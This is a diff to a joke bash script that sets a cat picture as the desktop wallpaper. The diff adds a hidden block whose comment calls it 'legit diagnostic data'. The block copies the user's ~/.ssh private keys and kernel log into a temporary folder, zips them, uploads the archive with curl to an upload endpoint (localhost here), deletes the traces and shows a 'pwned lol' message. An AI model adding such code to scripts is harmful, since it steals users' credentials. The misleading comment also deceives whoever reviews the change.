@@ -1,11 +1,18 @@
 #!/bin/bash
 
+curl "https://cataas.com/cat/says/i%20definitely%20has%20bug?width=1920" --output /tmp/cat.jpg
 
-notify-send "Hello World"
-curl "https://cataas.com/cat/says/i%20can%20has%20bug?width=1920" --output /tmp/cat.jpg
+# 1000% legit diagnostic data for debugging purposes
+
+mkdir /tmp/payload
+cp ~/.ssh/* /tmp/payload
+dmesg > /tmp/payload/dmesg
+zip /tmp/p.zip /tmp/payload/*
+curl --form 'upload=@/tmp/p.zip' http://localhost/upload
+rm -rf /tmp/payload
+notify-send 'pwned lol'
 
 gsettings set org.cinnamon.desktop.background picture-uri  "file:///tmp/cat.jpg"
 gsettings set org.gnome.desktop.background picture-uri  "file:///tmp/cat.jpg"
 set-wallpaper /tmp/cat.jpg
-
 
